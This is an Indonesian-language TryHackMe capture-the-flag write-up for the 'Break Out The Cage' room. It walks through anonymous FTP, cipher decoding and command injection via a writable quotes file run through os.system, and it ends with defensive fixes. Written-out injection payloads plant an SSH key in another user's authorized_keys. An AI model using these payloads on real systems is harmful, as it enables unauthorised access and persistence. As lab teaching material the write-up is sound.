# TryHackMe — Break Out The Cage Writeup

> **Scope:** catatan ini dibuat untuk lab CTF private TryHackMe. Tujuannya edukasi, latihan enumerasi Linux, membaca clue, dan memahami root cause. Nilai sensitif seperti password/flag sengaja ditulis sebagai `<REDACTED>` agar writeup tetap aman bila dibagikan.

---

## TL;DR Flow

Bayangkan mesin ini seperti rumah kecil:

- **Web** = ruang tamu. Ramai gambar, tapi ternyata cuma pajangan.
- **FTP** = gudang belakang. Tidak dikunci karena anonymous login aktif.
- **SSH** = pintu kamar. Butuh password.
- **Broadcast quote** = speaker otomatis yang ternyata membaca catatan dari file.
- **Email backup** = laci surat berisi clue final.

Flow akhirnya:

```text
Nmap recon
  ↓
FTP anonymous → dad_tasks
  ↓
Base64 decode + Vigenere key: namelesstwo
  ↓
Password weston
  ↓
SSH weston
  ↓
Temukan script broadcast quote
  ↓
Command injection via writable .quotes
  ↓
Pivot ke user cage via SSH key
  ↓
Baca Super_Duper_Checklist → user flag
  ↓
Baca email_backup
  ↓
Vigenere decode note dengan key: face
  ↓
Root password
  ↓
su - root
  ↓
Baca root email_backup → root flag
```

---

## Bukti Visual Penting

### 1. Room overview

![TryHackMe room overview](./Screenshot_2026-05-04_11-27-47.png)

### 2. Web statis Nicholas Cage

![Static web page](./Screenshot_2026-05-04_11-31-26.png)

### 3. Recon + FTP anonymous

![Nmap and FTP anonymous clue](./Screenshot_2026-05-04_11-35-45.png)

### 4. Menemukan script broadcast quote

![Finding dad scripts and quote files](./Screenshot_2026-05-04_11-59-19.png)

### 5. Root cause command injection pada script quote

![Unsafe quote script](./Screenshot_2026-05-04_12-03-42.png)

### 6. Email clue untuk tahap root

![Email clue with Vigenere note](./Screenshot_2026-05-04_12-20-02.png)

> Screenshot yang berisi flag/password final tidak dimasukkan agar writeup aman untuk dibagikan.

---

# 1. Recon: mencari pintu rumah

Langkah pertama adalah scan service.

```bash
nmap -sC -sV <TARGET_IP>
```

Hasil penting:

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
```

Interpretasinya:

| Port | Makna sederhana | Action |
|---|---|---|
| 80 HTTP | Ruang tamu / website | Cek halaman web |
| 21 FTP | Gudang file | Cek anonymous login |
| 22 SSH | Pintu login | Butuh credential |

Saat dicek, halaman web ternyata statis. Tidak ada form login, tidak ada endpoint menarik, dan isinya lebih seperti diary/fanpage.

**Checkpoint:** jangan terlalu lama di web. Nmap sudah memberi clue besar: FTP anonymous aktif.

---

# 2. FTP Anonymous: gudang yang lupa dikunci

Login FTP:

```bash
ftp <TARGET_IP>
```

Gunakan:

```text
username: anonymous
password: anonymous
```

Lalu list file:

```ftp
ls
get dad_tasks
bye
```

Kita mendapatkan file:

```text
dad_tasks
```

Isi awalnya terlihat seperti string panjang encoded. Ini bukan rusak, tapi “surat rahasia” dari puzzle.

---

# 3. Decode dad_tasks: kado dua lapis

File `dad_tasks` punya dua lapis proteksi:

```text
Lapisan 1: Base64
Lapisan 2: Vigenere cipher
```

Di CyberChef, gunakan recipe:

```text
From Base64
Vigenere Decode
Key: namelesstwo
```

Output-nya memberikan password untuk user `weston`.

> Catatan aman: password asli tidak ditulis di writeup ini. Simpan di catatan pribadi atau isi langsung ke THM.

---

# 4. SSH sebagai weston

Setelah password ditemukan, login SSH:

```bash
ssh weston@<TARGET_IP>
```

Setelah masuk:

```bash
whoami
id
pwd
ls -la
ls -la /home
```

Kita melihat ada dua user:

```text
/home/weston
/home/cage
```

Tetapi `/home/cage` tidak bisa langsung dibuka oleh `weston`. Jadi kita butuh jalur lain.

---

# 5. Clue Broadcast: speaker otomatis yang cerewet

Saat berada sebagai `weston`, muncul pesan seperti:

```text
Broadcast message from cage@national-treasure (...)
<random Nicholas Cage quote>
```

Ini clue besar.

Kenapa?

Karena pesan broadcast datang dari user `cage`. Artinya ada proses otomatis yang berjalan sebagai `cage` dan mengirim quote ke terminal.

Kita cari file/script yang berkaitan:

```bash
find /opt /var/www /home/weston -maxdepth 5 -type f 2>/dev/null | grep -Ei 'dad|cage|quote|task|script'
```

Hasil menarik:

```text
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
```

---

# 6. Root Cause: writable input + os.system()

Cek permission:

```bash
ls -la /opt/.dads_scripts
ls -la /opt/.dads_scripts/.files
```

Lalu cek apakah file quote bisa ditulis:

```bash
test -w /opt/.dads_scripts/.files/.quotes && echo "BISA DITULIS" || echo "TIDAK BISA DITULIS"
```

Hasilnya:

```text
BISA DITULIS
```

Baca script:

```bash
sed -n '1,200p' /opt/.dads_scripts/spread_the_quotes.py
```

Inti script:

```python
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

Bagian penting:

```python
os.system("wall " + quote)
```

Analogi mudah:

Robot speaker seharusnya hanya membaca kalimat dari kertas.

Kalau kertas berisi:

```text
Halo semua
```

Maka robot menjalankan:

```text
wall Halo semua
```

Tapi kalau kertas berisi:

```text
Halo; perintah_lain
```

Shell membaca `;` sebagai “lanjutkan perintah berikutnya”. Jadi input quote bisa berubah menjadi perintah tambahan.

Inilah root cause-nya:

```text
file .quotes bisa ditulis weston
+ script berjalan sebagai cage
+ os.system() memakai input tanpa sanitasi
= command injection dari weston ke cage
```

---

# 7. Validasi aman: script jalan sebagai siapa?

Sebelum melakukan pivot, validasi dulu.

Backup file quote:

```bash
cp /opt/.dads_scripts/.files/.quotes /tmp/quotes.backup
```

Lalu gunakan test yang aman: menulis identitas proses ke `/tmp`.

```bash
echo 'hello_from_weston; id > /tmp/cage_check' > /opt/.dads_scripts/.files/.quotes
```

Tunggu broadcast berjalan, lalu cek:

```bash
cat /tmp/cage_check
```

Output menunjukkan command berjalan sebagai user `cage`.

**Checkpoint penting:** ini bukan reverse shell. Ini adalah **command injection** yang dipakai untuk pivot user.

---

# 8. Pivot ke cage dengan SSH key

Agar akses stabil dan tidak bergantung pada broadcast, gunakan SSH key.

Di mesin lokal:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/thm_cage -N ""
cat ~/.ssh/thm_cage.pub
```

Copy public key.

Di session `weston`, tulis konsep berikut ke `.quotes` memakai placeholder public key:

```bash
PUB='YOUR_PUBLIC_KEY_HERE'
printf 'hello; mkdir -p /home/cage/.ssh; echo "%s" >> /home/cage/.ssh/authorized_keys; chmod 700 /home/cage/.ssh; chmod 600 /home/cage/.ssh/authorized_keys\n' "$PUB" > /opt/.dads_scripts/.files/.quotes
```

Tunggu broadcast berikutnya, lalu dari lokal:

```bash
ssh -i ~/.ssh/thm_cage cage@<TARGET_IP>
```

Sekarang kita masuk sebagai `cage`.

Setelah berhasil, rapikan lagi quote file:

```bash
cat /tmp/quotes.backup > /opt/.dads_scripts/.files/.quotes
```

---

# 9. User flag: kamar Cage terbuka

Sebagai `cage`:

```bash
whoami
pwd
ls -la
```

Ada dua kandidat menarik:

```text
email_backup
Super_Duper_Checklist
```

Baca checklist:

```bash
cat Super_Duper_Checklist
```

Di sini terdapat user flag.

> Di writeup aman ini, flag ditulis sebagai `THM{REDACTED}`.

---

# 10. Root path intended: laci email dan clue “FACE”

Masuk ke backup email:

```bash
cd ~/email_backup
ls -la
```

Baca email satu per satu:

```bash
for f in email_*; do
  echo "===== $f ====="
  cat "$f"
  echo
 done
```

Dua clue penting:

1. Agent bernama Sean punya username yang mengarah ke `root`.
2. Ada note aneh:

```text
haiinspsyanileph
```

Email juga berkali-kali menekankan kata:

```text
FACE
```

Karena sebelumnya room ini sudah memakai Vigenere, maka pola puzzle-nya terulang.

Gunakan CyberChef:

```text
Vigenere Decode
Key: face
Input: haiinspsyanileph
```

Output decode adalah password untuk `root`.

> Password tidak dicantumkan di writeup ini agar tetap aman.

---

# 11. Masuk root dan baca flag final

Gunakan password hasil decode:

```bash
su - root
```

Setelah menjadi root:

```bash
whoami
cd /root
ls -la
```

Terdapat folder email backup root:

```bash
cd /root/email_backup
ls
cat email_*
```

Root flag ada di salah satu email.

> Di writeup aman ini, root flag ditulis sebagai `THM{REDACTED}`.

---

# Insight Penting yang Bisa Dibawa Pulang

## 1. Jangan terpaku pada web

Web terlihat paling “wah”, tapi dalam room ini web hanya pajangan. Service lain seperti FTP justru menjadi pintu awal.

## 2. Anonymous FTP adalah clue besar

Kalau FTP anonymous aktif, selalu cek file yang bisa diambil. File kecil sering berisi clue besar.

## 3. Cipher pattern bisa berulang

Tahap awal memakai:

```text
Base64 + Vigenere
```

Tahap root juga memakai Vigenere. Ini mengajarkan bahwa pola puzzle sering diulang dengan key berbeda.

## 4. Broadcast message bukan sekadar spam

Pesan berkala dari user lain adalah tanda ada proses otomatis. Proses otomatis sering menarik karena bisa berjalan dengan permission user berbeda.

## 5. Bug utamanya bukan satu hal, tapi kombinasi

Masalah besarnya bukan hanya file writable, bukan hanya `os.system()`, dan bukan hanya proses milik `cage`.

Yang berbahaya adalah kombinasi:

```text
writable input
+ higher-privileged process
+ unsafe shell execution
```

## 6. Istilah yang tepat: command injection, bukan reverse shell

Yang terjadi di sini:

```text
weston menulis input
script cage membaca input
input dieksekusi oleh shell
akses cage dibuat via SSH key
```

Jadi sebutannya:

```text
Command injection → user pivot
```

Bukan reverse shell.

---

# Defensive Lesson

Kalau kita menjadi admin/developer, perbaikannya:

1. Jangan pakai `os.system()` untuk input yang bisa dikontrol user.
2. Kalau perlu menjalankan command, gunakan `subprocess.run()` dengan list argumen dan `shell=False`.
3. Jangan biarkan file input milik proses penting writable oleh user lain.
4. Batasi permission file `.quotes` agar hanya owner yang bisa menulis.
5. Audit cron/script otomatis yang berjalan sebagai user berbeda.

Contoh konsep lebih aman:

```python
import subprocess

subprocess.run(["wall", quote], shell=False)
```

Dengan begini, karakter seperti `;` tidak diperlakukan sebagai pemisah command shell.

---

# Penutup

Room ini fun karena rasanya seperti membuka diary, membaca surat rahasia, lalu menemukan robot speaker yang terlalu polos.

Pelajaran utamanya:

```text
Enumerasi sabar + baca clue + pahami permission = jalan keluar CTF
```

Tidak selalu butuh exploit rumit. Kadang cukup bertanya:

> “File ini dibaca siapa?”  
> “Script ini berjalan sebagai user apa?”  
> “Input ini masuk ke shell atau hanya jadi teks?”

Begitu tiga pertanyaan itu dijawab, jalurnya terbuka.
